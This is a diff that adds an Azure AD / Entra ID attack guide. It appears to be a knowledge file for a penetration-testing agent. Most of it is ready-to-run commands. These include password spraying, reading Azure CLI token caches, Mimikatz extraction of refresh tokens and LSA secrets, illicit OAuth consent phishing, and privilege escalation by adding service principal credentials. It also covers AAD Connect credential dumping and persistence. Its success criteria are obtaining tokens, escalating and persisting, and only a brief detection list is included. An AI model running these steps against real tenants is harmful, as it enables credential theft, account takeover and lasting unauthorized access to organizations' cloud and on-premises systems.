@@ -1,0 +1,174 @@
+<vulnerability_guide>
+  <title>AZURE AD / ENTRA ID ATTACKS</title>
+
+  <critical>Azure AD (now Microsoft Entra ID) is the identity backbone for Microsoft 365 and Azure. Compromising Azure AD can provide access to cloud resources, on-premises environments via hybrid sync, and sensitive data across the organization.</critical>
+
+  <scope>
+    - Azure AD enumeration
+    - Authentication attacks (password spray, token theft)
+    - Privilege escalation paths
+    - Application consent attacks
+    - Hybrid identity exploitation
+    - Conditional access bypass
+  </scope>
+
+  <methodology>
+    1. AZURE AD ENUMERATION
+       {% raw %}
+       # Using AzureAD PowerShell
+       Connect-AzureAD
+       Get-AzureADUser -All $true
+       Get-AzureADGroup -All $true
+       Get-AzureADDirectoryRole
+       Get-AzureADServicePrincipal -All $true
+
+       # Using Microsoft Graph
+       Connect-MgGraph -Scopes "User.Read.All","Group.Read.All"
+       Get-MgUser -All
+       Get-MgGroup -All
+
+       # AzureHound for BloodHound
+       azurehound list -u user@domain.com -p password -o output.json
+
+       # ROADtools
+       roadrecon auth -u user@domain.com -p password
+       roadrecon gather
+       roadrecon gui
+       {% endraw %}
+
+    2. PASSWORD SPRAY ATTACKS
+       {% raw %}
+       # Using MSOLSpray
+       Invoke-MSOLSpray -UserList users.txt -Password "Winter2024!"
+
+       # Using Spray
+       spray.py -emails users.txt -password "Password123" -url https://login.microsoftonline.com/tenant_id
+
+       # Using Trevorspray
+       trevorspray -e emails.txt -p "CompanyName2024!"
+
+       # Check for smart lockout thresholds first
+       # Default: 10 failed attempts per minute
+       {% endraw %}
+
+    3. TOKEN THEFT AND ABUSE
+       {% raw %}
+       # Steal tokens from az cli
+       cat ~/.azure/accessTokens.json
+       cat ~/.azure/msal_token_cache.json
+
+       # Use stolen token
+       $token = "eyJ0eX..."
+       Connect-AzAccount -AccessToken $token -AccountId user@domain.com
+
+       # Request token for different resource
+       az account get-access-token --resource https://graph.microsoft.com
+
+       # Primary Refresh Token (PRT) extraction
+       Mimikatz# sekurlsa::cloudap
+       Mimikatz# dpapi::cloudapkd /keyvalue:... /unprotect
+       {% endraw %}
+
+    4. APPLICATION CONSENT ATTACKS
+       {% raw %}
+       # Create malicious application
+       # Request high-privilege permissions via OAuth consent
+
+       # Illicit consent grant attack
+       # Phish user to consent to app with:
+       # - Mail.Read, Mail.Send
+       # - Files.ReadWrite.All
+       # - User.Read.All
+
+       # Check for apps with excessive permissions
+       Get-AzureADServicePrincipal | % {
+         Get-AzureADServiceAppRoleAssignment -ObjectId $_.ObjectId
+       }
+       {% endraw %}
+  </methodology>
+
+  <advanced_techniques>
+    <privilege_escalation>
+      {% raw %}
+      # Global Admin from Application Admin
+      # If you have Application Admin + owns an app with high privileges
+
+      # Add credentials to service principal
+      $sp = Get-AzureADServicePrincipal -SearchString "TargetApp"
+      New-AzureADServicePrincipalPasswordCredential -ObjectId $sp.ObjectId
+
+      # Abuse directory roles
+      Get-AzureADDirectoryRole | % {
+        Get-AzureADDirectoryRoleMember -ObjectId $_.ObjectId
+      }
+      {% endraw %}
+    </privilege_escalation>
+
+    <hybrid_attacks>
+      {% raw %}
+      # Azure AD Connect - extract credentials
+      # On AAD Connect server
+      Get-ADSyncDatabaseConfiguration | fl
+
+      # Dump service account
+      Invoke-ADSyncDcPasswordRetrieval
+
+      # Pass-through Authentication abuse
+      # Compromise PTA agent for credential harvesting
+
+      # Seamless SSO - extract machine account
+      Mimikatz# lsadump::secrets
+      # Look for AZUREADSSOACC$ computer account
+      {% endraw %}
+    </hybrid_attacks>
+
+    <conditional_access_bypass>
+      - Device compliance bypass via Intune enrollment
+      - Location bypass via VPN/proxy
+      - Legacy authentication protocols if enabled
+      - Application exclusions
+      - Break glass accounts
+    </conditional_access_bypass>
+
+    <persistence>
+      {% raw %}
+      # Add credentials to existing app
+      New-AzureADApplicationPasswordCredential -ObjectId $appId
+
+      # Register new service principal
+      New-AzureADServicePrincipal -AppId $appId
+
+      # Add federated identity provider (Golden SAML)
+      # Requires access to ADFS token signing certificate
+
+      # Add custom domain with federation
+      {% endraw %}
+    </persistence>
+  </advanced_techniques>
+
+  <detection>
+    - Audit log: "Add service principal credentials"
+    - Sign-in logs: Unusual locations, impossible travel
+    - Consent grants for high-privilege permissions
+    - New federation trust configurations
+    - Service principal sign-ins without user context
+  </detection>
+
+  <validation>
+    - Successfully enumerate Azure AD objects
+    - Obtain valid access tokens
+    - Escalate privileges within Azure AD
+    - Access target cloud resources
+    - Establish persistence mechanisms
+  </validation>
+
+  <pro_tips>
+    - Always check managed identities on Azure VMs
+    - IMDS endpoint (169.254.169.254) leaks tokens
+    - Application Admin can escalate to Global Admin via app abuse
+    - PRT gives SSO to all Azure AD-integrated apps
+    - ROADtools provides excellent offline analysis
+  </pro_tips>
+
+  <remember>Azure AD is not just cloud - hybrid environments create bidirectional attack paths. Compromising on-prem AD can lead to Azure AD, and vice versa. Always enumerate both environments and look for sync accounts, federation trusts, and cross-environment privilege paths.</remember>
+</vulnerability_guide>
